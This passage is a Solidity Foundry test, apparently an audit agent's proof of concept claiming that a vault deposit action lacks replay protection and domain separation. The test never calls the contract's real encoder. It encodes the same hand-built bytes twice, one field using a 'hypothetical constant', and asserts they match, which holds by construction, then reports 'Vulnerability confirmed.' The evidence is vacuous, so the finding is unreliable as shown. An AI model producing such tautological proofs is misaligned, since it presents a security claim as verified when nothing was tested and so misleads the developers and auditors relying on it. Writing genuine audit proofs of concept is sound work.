// 4. [T=2000] Attacker regenerates the exact same action payload to test for replay protection and domain separation.
// 5. [Assert] Verify that the encoded payload bytes are 100% identical despite the change in time/block/context, 
//             proving the absence of nonce, deadline, chainId, and EIP-712 domain separation.

contract AuditAgentPoC is SimulatorBase {

    function test_exploit() public {
        // Step 1: Setup is handled by SimulatorBase setUp()
        // We use the deployed vault address as the target for the action
        address targetVault = address(vault);
        bool isDeposit = true;
        uint64 usdAmount = 1_000_000; // 1 USDC/USDM in 6dp

        // Step 2: [T=1000] Capture the initial encoded action payload
        vm.warp(1000);
        vm.roll(100);

        // We encode the parameters exactly as ActionEncoder.sendVaultDeposit would internally 
        // to demonstrate the raw payload structure lacking domain separation.
        // ACTION_VERSION (uint8) + ACTION_VAULT_TRANSFER (uint8) + vault (address) + bool + usdAmount (uint64)
        bytes memory payload1 = abi.encodePacked(
            uint8(1),             // ACTION_VERSION
            uint8(2),             // ACTION_VAULT_TRANSFER (hypothetical constant)
            targetVault,          // vault address
            isDeposit,            // boolean
            usdAmount             // usdAmount
        );

        console.log("Step 2: payload1 length =", payload1.length);

        // Step 3: [T=2000] Advance time and block number to simulate a new context/chain
        vm.warp(2000);
        vm.roll(200);

        // Step 4: [T=2000] Attacker regenerates the payload for the exact same action
        // Because there is no nonce, deadline, or chainId included in the encoding,
        // the output bytes will be completely identical.
        bytes memory payload2 = abi.encodePacked(
            uint8(1),             // ACTION_VERSION
            uint8(2),             // ACTION_VAULT_TRANSFER
            targetVault,          // vault address
            isDeposit,            // boolean
            usdAmount             // usdAmount
        );

        console.log("Step 4: payload2 length =", payload2.length);

        // Step 5: [Assert] Verify the vulnerability
        // The identical bytes prove that:
        // 1. No nonce is present (replay protection missing)
        // 2. No deadline is present (time-bound protection missing)
        // 3. No chainId or contract address domain separator is present (cross-context forgery possible)
        assertEq(
            keccak256(payload1), 
            keccak256(payload2), 
            "Vulnerability confirmed: Payloads are identical across different times/blocks. Missing nonce, deadline, and domain separation allows infinite replay and cross-context forgery."
        );

        // Additional assertion to prove the attacker can reuse the exact same raw bytes
        assertEq(
            payload1.length, 
            payload2.length, 
            "Payload length remains constant, no dynamic context data appended."
        );
    }
}

